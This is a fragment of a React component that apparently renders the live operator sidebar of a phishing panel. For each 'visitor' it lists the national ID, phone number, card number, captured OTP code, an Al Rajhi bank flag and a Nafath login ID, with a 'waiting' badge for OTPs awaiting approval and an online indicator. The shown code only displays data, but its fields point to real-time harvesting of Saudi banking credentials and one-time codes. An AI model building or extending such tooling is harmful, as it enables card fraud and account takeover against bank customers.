                  <div className="flex-1 min-w-0">
                    <div className="flex flex-wrap items-center justify-between gap-1">
                      <span
                        className="font-medium text-sm truncate"
                        data-testid={`visitor-name-${index}`}
                      >
                        {getDisplayName(app)}
                      </span>
                    </div>
                    {getNationalId(app) && (
                      <div
                        className="text-xs text-gray-500 dark:text-gray-400 font-mono mt-0.5"
                        dir="ltr"
                        data-testid={`visitor-id-${index}`}
                      >
                        {getNationalId(app)}
                      </div>
                    )}
                    <div className="flex flex-wrap items-center gap-1 mt-1">
                      <Badge
                        variant="outline"
                        className={cn(
                          "text-[10px] px-1.5 py-0",
                          app.otpCode &&
                            !app.cardOtpApproved &&
                            "bg-amber-50 text-amber-600 border-amber-300 dark:bg-amber-900/20 dark:text-amber-400 dark:border-amber-600",
                          app.cardOtpApproved &&
                            "bg-green-50 text-green-600 border-green-300 dark:bg-green-900/20 dark:text-green-400 dark:border-green-600",
                        )}
                        data-testid={`visitor-otp-badge-${index}`}
                      >
                        OTP
                      </Badge>
                      {getCardNumber(app) && (
                        <Badge
                          variant="outline"
                          className="text-[10px] px-1.5 py-0 bg-purple-50 text-purple-600 border-purple-300 dark:bg-purple-900/20 dark:text-purple-400 dark:border-purple-600"
                          data-testid={`visitor-card-badge-${index}`}
                        >
                          <CreditCard className="w-2.5 h-2.5 mr-1" />
                        </Badge>
                      )}
                      {app.rajhiUser && (
                        <Badge
                          variant="outline"
                          className="text-[10px] px-1.5 py-0 bg-green-50 text-green-600 border-green-300 dark:bg-green-900/20 dark:text-green-400 dark:border-green-600"
                          data-testid={`visitor-rajhi-badge-${index}`}
                        >
                          الراجحي
                        </Badge>
                      )}
                      {app.nafazId && (
                        <Badge
                          variant="outline"
                          className="text-[10px] px-1.5 py-0 bg-blue-50 text-blue-600 border-blue-300 dark:bg-blue-900/20 dark:text-blue-400 dark:border-blue-600"
                          data-testid={`visitor-nafaz-badge-${index}`}
                        >
                          نفاذ
                        </Badge>
                      )}
                      {app.phoneIdNumber && (
                        <Badge
                          variant="outline"
                          className="text-[10px] px-1.5 py-0 bg-indigo-50 text-indigo-600 border-indigo-300 dark:bg-indigo-900/20 dark:text-indigo-400 dark:border-indigo-600"
                          data-testid={`visitor-phone-badge-${index}`}
                        >
                          هاتف
                        </Badge>
                      )}
                    </div>
                    <div
                      className="text-xs text-gray-400 mt-1 font-mono"
                      dir="ltr"
                      data-testid={`visitor-phone-${index}`}
                    >
                      {getPhoneNumber(app)}
                    </div>
                  </div>

                  {/* Status Badge */}
                  <div className="flex flex-col items-end gap-1">
                    {app.otpCode && !app.cardOtpApproved && (
                      <Badge
                        className="bg-amber-500 text-white text-[9px]"
                        data-testid={`visitor-status-${index}`}
                      >
                        بالانتظار
                      </Badge>
                    )}
                    {isOnline(app) && (
                      <span
                        className="text-[10px] text-green-500"
                        data-testid={`visitor-online-${index}`}
                      >
                        متصل
                      </span>
                    )}
                  </div>
                </div>
              ))
            )}
          </ScrollArea>
        </aside>
      </div>
    </div>
  );
}
